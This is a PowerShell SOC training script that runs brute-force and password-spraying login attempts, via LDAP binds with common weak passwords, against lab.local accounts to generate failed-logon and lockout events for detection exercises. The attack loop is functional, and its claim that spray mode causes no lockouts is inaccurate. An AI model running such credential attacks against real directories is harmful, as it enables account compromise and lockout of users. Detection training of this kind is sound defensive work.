#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Simulates brute-force and password spraying attacks for SOC detection training.

.DESCRIPTION
    TRAINING TOOL — Generates realistic failed logon telemetry by attempting
    authentication with intentionally wrong passwords against lab domain accounts.
    This creates Event ID 4625 (failed logon) entries in the Security event log
    and may trigger Event ID 4740 (account lockout) if attempts exceed the lockout
    threshold configured in Group Policy.

    The generated telemetry can then be detected using the SOC query scripts in
    scripts/soc-queries/.

    WARNING: This script is designed for use in the lab.local training environment
    ONLY. Do not run this against production Active Directory domains.

    Attack Modes:
      Default (brute force) — Cycles through all passwords for one user before
        moving to the next. Simulates a targeted credential attack against
        individual accounts.
      Spray mode (-SprayMode) — Tries one password against ALL users before
        moving to the next password. Simulates a low-and-slow password spraying
        attack designed to avoid per-account lockout thresholds.

    MITRE ATT&CK References:
      T1110.001 — Brute Force: Password Guessing
      https://attack.mitre.org/techniques/T1110/001/

      T1110.003 — Brute Force: Password Spraying
      https://attack.mitre.org/techniques/T1110/003/

.PARAMETER TargetUsers
    Array of usernames to target. Default: alice.johnson, bob.williams, carol.davis.

.PARAMETER AttemptsPerUser
    Number of failed authentication attempts per user. Default: 8.
    The lab lockout threshold is 5, so the default generates lockout events.

.PARAMETER DelaySeconds
    Delay in seconds between authentication attempts. Default: 2.
    Simulates realistic attack timing rather than instant flooding.

.PARAMETER DomainController
    Domain controller to authenticate against. Default: DC01.lab.local.

.PARAMETER SprayMode
    Switch to enable password spraying mode. Instead of brute-forcing one user
    at a time, tries each password against all users before moving to the next
    password. This is a common attacker technique to avoid account lockouts.

.EXAMPLE
    .\Simulate-BruteForce.ps1
    Run brute-force simulation against default users with 8 attempts each.

.EXAMPLE
    .\Simulate-BruteForce.ps1 -SprayMode -DelaySeconds 5
    Run password spraying simulation with longer delays between attempts.

.EXAMPLE
    .\Simulate-BruteForce.ps1 -TargetUsers @("emma.wilson", "frank.taylor") -AttemptsPerUser 4
    Target specific users with fewer attempts (below lockout threshold).

.EXAMPLE
    .\Simulate-BruteForce.ps1 -SprayMode -AttemptsPerUser 3 -DelaySeconds 10
    Low-and-slow password spray — fewer attempts with longer delays to simulate
    an attacker trying to stay under detection thresholds.
#>

param(
    [string[]]$TargetUsers     = @("alice.johnson", "bob.williams", "carol.davis"),
    [int]$AttemptsPerUser      = 8,
    [int]$DelaySeconds         = 2,
    [string]$DomainController  = "DC01.lab.local",
    [switch]$SprayMode
)

# ── Configuration ─────────────────────────────────────────────────────
$Domain = "lab.local"

# Intentionally wrong passwords — no real credentials
$BadPasswords = @(
    "Summer2024!"
    "Welcome1!"
    "Password123!"
    "Company2024!"
    "Qwerty123!"
    "Admin2024!"
    "Changeme1!"
    "Letmein123!"
    "Spring2024!"
    "Winter2024!"
)

# ── Banner ────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║         BRUTE FORCE ATTACK SIMULATION — TRAINING ONLY      ║" -ForegroundColor Red
Write-Host "║   Generates Event ID 4625 / 4740 for SOC detection labs    ║" -ForegroundColor Red
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

if ($SprayMode) {
    $ModeLabel = "Password Spraying (T1110.003)"
    Write-Host "[*] Mode:    Password Spray — one password per round across all users" -ForegroundColor Yellow
} else {
    $ModeLabel = "Brute Force (T1110.001)"
    Write-Host "[*] Mode:    Brute Force — all attempts per user before moving on" -ForegroundColor Yellow
}

Write-Host "[*] Targets: $($TargetUsers -join ', ')" -ForegroundColor Cyan
Write-Host "[*] Attempts per user: $AttemptsPerUser" -ForegroundColor Cyan
Write-Host "[*] Delay between attempts: ${DelaySeconds}s" -ForegroundColor Cyan
Write-Host "[*] Domain Controller: $DomainController" -ForegroundColor Cyan
Write-Host "[*] MITRE ATT&CK: $ModeLabel" -ForegroundColor Cyan
Write-Host ""

$TotalAttempts = $TargetUsers.Count * $AttemptsPerUser
Write-Host "[*] Total attempts planned: $TotalAttempts" -ForegroundColor White
Write-Host "[*] Estimated duration: $($TotalAttempts * $DelaySeconds) seconds" -ForegroundColor White
Write-Host ""

# ── Helper: Attempt Authentication ────────────────────────────────────
function Invoke-FailedLogon {
    param(
        [string]$Username,
        [string]$Password,
        [string]$DC,
        [string]$DomainName,
        [int]$AttemptNumber,
        [int]$TotalCount
    )

    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    try {
        # LDAP bind attempt — generates Event ID 4625 on the DC
        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$DC",
            "$DomainName\$Username",
            $Password
        )

        # Force the bind attempt by accessing a property
        $null = $DirectoryEntry.distinguishedName

        # If we get here, the password was somehow correct (should not happen)
        Write-Host "[$Timestamp] Attempt ${AttemptNumber}/${TotalCount}: $Username — UNEXPECTED SUCCESS" -ForegroundColor Red
        Write-Host "[!] WARNING: Authentication succeeded — this should not happen with test passwords." -ForegroundColor Red
    } catch {
        # Expected outcome — failed authentication generates Event ID 4625
        Write-Host "[$Timestamp] Attempt ${AttemptNumber}/${TotalCount}: $Username — FAILED (expected)" -ForegroundColor DarkGray
    } finally {
        if ($DirectoryEntry) {
            $DirectoryEntry.Dispose()
        }
    }
}

# ── Execute Attack Simulation ─────────────────────────────────────────
$AttemptCounter = 0
$StartTime = Get-Date

if ($SprayMode) {
    # ── Password Spraying Mode ────────────────────────────────────────
    # Try one password against all users, then move to next password
    Write-Host "[*] Starting password spray..." -ForegroundColor Yellow
    Write-Host ""

    for ($Round = 0; $Round -lt $AttemptsPerUser; $Round++) {
        $Password = $BadPasswords[$Round % $BadPasswords.Count]
        Write-Host "[*] Round $($Round + 1)/$AttemptsPerUser — Password: $('*' * $Password.Length)" -ForegroundColor Cyan

        foreach ($User in $TargetUsers) {
            $AttemptCounter++
            Invoke-FailedLogon -Username $User -Password $Password -DC $DomainController `
                -DomainName $Domain -AttemptNumber $AttemptCounter -TotalCount $TotalAttempts

            if ($AttemptCounter -lt $TotalAttempts) {
                Start-Sleep -Seconds $DelaySeconds
            }
        }
        Write-Host ""
    }
} else {
    # ── Brute Force Mode ──────────────────────────────────────────────
    # Try all passwords against one user, then move to next user
    Write-Host "[*] Starting brute force..." -ForegroundColor Yellow
    Write-Host ""

    foreach ($User in $TargetUsers) {
        Write-Host "[*] Targeting: $User" -ForegroundColor Cyan

        for ($i = 0; $i -lt $AttemptsPerUser; $i++) {
            $AttemptCounter++
            $Password = $BadPasswords[$i % $BadPasswords.Count]

            Invoke-FailedLogon -Username $User -Password $Password -DC $DomainController `
                -DomainName $Domain -AttemptNumber $AttemptCounter -TotalCount $TotalAttempts

            if ($AttemptCounter -lt $TotalAttempts) {
                Start-Sleep -Seconds $DelaySeconds
            }
        }
        Write-Host ""
    }
}

$EndTime = Get-Date
$Duration = $EndTime - $StartTime

# ── Summary ───────────────────────────────────────────────────────────
$LockoutThreshold = 5
$ExpectedLockouts = ($TargetUsers | Where-Object { $AttemptsPerUser -ge $LockoutThreshold }).Count

Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                    SIMULATION COMPLETE                      ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "[*] Results:" -ForegroundColor Cyan
Write-Host "    Total attempts:      $AttemptCounter" -ForegroundColor White
Write-Host "    Duration:            $($Duration.ToString('mm\:ss'))" -ForegroundColor White
Write-Host "    Mode:                $ModeLabel" -ForegroundColor White
Write-Host "    Users targeted:      $($TargetUsers.Count)" -ForegroundColor White

if ($AttemptsPerUser -ge $LockoutThreshold) {
    if ($SprayMode) {
        Write-Host "    Expected lockouts:   0 (spray mode stays below per-round threshold)" -ForegroundColor Yellow
    } else {
        Write-Host "    Expected lockouts:   $ExpectedLockouts (lockout threshold: $LockoutThreshold)" -ForegroundColor Yellow
    }
} else {
    Write-Host "    Expected lockouts:   0 (attempts below lockout threshold of $LockoutThreshold)" -ForegroundColor Green
}

Write-Host ""
Write-Host "[*] Simulation complete. To detect this attack, run:" -ForegroundColor Green
Write-Host "    .\scripts\soc-queries\Get-FailedLogons.ps1 -Hours 1 -Threshold 3" -ForegroundColor White
Write-Host "    .\scripts\soc-queries\Get-AccountLockouts.ps1 -Hours 1" -ForegroundColor White
Write-Host ""
Write-Host "[*] For the full detection playbook, see:" -ForegroundColor Green
Write-Host "    scenarios\01-brute-force\PLAYBOOK.md" -ForegroundColor White
Write-Host ""
